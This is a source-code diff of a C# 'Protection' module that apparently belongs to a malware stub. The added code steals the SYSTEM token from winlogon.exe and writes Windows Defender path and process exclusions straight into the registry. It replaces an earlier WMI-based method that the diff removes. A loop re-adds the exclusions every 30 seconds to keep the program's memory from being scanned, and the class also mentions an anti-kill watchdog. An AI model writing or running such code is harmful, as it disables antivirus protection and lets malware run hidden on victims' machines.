@@ -480,12 +480,12 @@ internal static partial class Protection
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool RevertToSelf();
 
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern int RegSetKeyValueW(nint hKey, string lpSubKey, string lpValueName, uint dwType, ref int lpData, uint cbData);
+
     private static volatile bool _exclusionLoopRunning;
 
     // Continuously re-adds path + process exclusions every 30s.
-    // Needed because Defender can remove exclusions during runtime (cloud-based protection, TPM reset).
-    // Also adds a process exclusion for the current exe name so Defender doesn't scan our memory.
-    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
     public static void StartExclusionLoop(string installPath)
     {
         if (_exclusionLoopRunning) return;
@@ -512,8 +512,9 @@ internal static partial class Protection
         t.Start();
     }
 
-    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
-    public static void AddDefenderProcessExclusion(string processName)
+    // Writes a REG_DWORD=0 to HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\<subKey>\<value>
+    // as SYSTEM (steals winlogon token) — same effect as the WMI MSFT_MpPreference call.
+    private static void SetDefenderRegistryExclusion(string subKey, string value)
     {
         nint hToken = 0, hDup = 0;
         bool impersonated = false;
@@ -533,18 +534,11 @@ internal static partial class Protection
                     CloseHandle(hProc);
                 }
             }
-
-            var scope = new System.Management.ManagementScope(
-                @"\\.\root\Microsoft\Windows\Defender");
-            scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
-            scope.Options.EnablePrivileges = true;
-            scope.Connect();
-
-            using var cls = new System.Management.ManagementClass(
-                scope, new System.Management.ManagementPath("MSFT_MpPreference"), null);
-            using var inParams = cls.GetMethodParameters("Add");
-            inParams["ExclusionProcess"] = new[] { processName };
-            cls.InvokeMethod("Add", inParams, null);
+            nint HKLM = unchecked((nint)0x80000002L);
+            int zero = 0;
+            RegSetKeyValueW(HKLM,
+                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\" + subKey,
+                value, 4 /*REG_DWORD*/, ref zero, 4);
         }
         catch { }
         finally
@@ -555,52 +549,13 @@ internal static partial class Protection
         }
     }
 
-    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
+    public static void AddDefenderProcessExclusion(string processName)
+        => SetDefenderRegistryExclusion("Processes", processName);
+
     public static void AddDefenderExclusion(string path)
     {
-        nint hToken = 0, hDup = 0;
-        bool impersonated = false;
-        try
-        {
-            // Steal SYSTEM token from winlogon.exe so the WMI call runs as SYSTEM
-            var wl = Process.GetProcessesByName("winlogon").FirstOrDefault();
-            if (wl != null)
-            {
-                nint hProc = OpenProcess(0x400 /*PROCESS_QUERY_INFORMATION*/, false, wl.Id);
-                if (hProc != 0)
-                {
-                    if (OpenProcessToken(hProc, 0x0002 /*TOKEN_DUPLICATE*/, out hToken))
-                    {
-                        // SecurityImpersonation=2, TokenImpersonation=2
-                        DuplicateTokenEx(hToken, 0xF01FF /*TOKEN_ALL_ACCESS*/, 0, 2, 2, out hDup);
-                        if (hDup != 0) impersonated = ImpersonateLoggedOnUser(hDup);
-                    }
-                    CloseHandle(hProc);
-                }
-            }
-
-            // MSFT_MpPreference.Add() — the Defender WMI provider (trusted) performs the change
-            var scope = new System.Management.ManagementScope(
-                @"\\.\root\Microsoft\Windows\Defender");
-            scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
-            scope.Options.EnablePrivileges = true;
-            scope.Connect();
-
-            using var cls = new System.Management.ManagementClass(
-                scope, new System.Management.ManagementPath("MSFT_MpPreference"), null);
-            using var inParams = cls.GetMethodParameters("Add");
-            inParams["ExclusionPath"] = new[] { path };
-            cls.InvokeMethod("Add", inParams, null);
-
-            StubLog.Info($"[Defender] Exclusion added: {path}");
-        }
-        catch (Exception ex) { StubLog.Error($"[Defender] WMI exclusion failed: {ex.Message}"); }
-        finally
-        {
-            if (impersonated) RevertToSelf();
-            if (hDup != 0) CloseHandle(hDup);
-            if (hToken != 0) CloseHandle(hToken);
-        }
+        SetDefenderRegistryExclusion("Paths", path);
+        StubLog.Info($"[Defender] Exclusion added: {path}");
     }
 
     // ── Anti-Kill Watchdog (usermode guardian process) ──
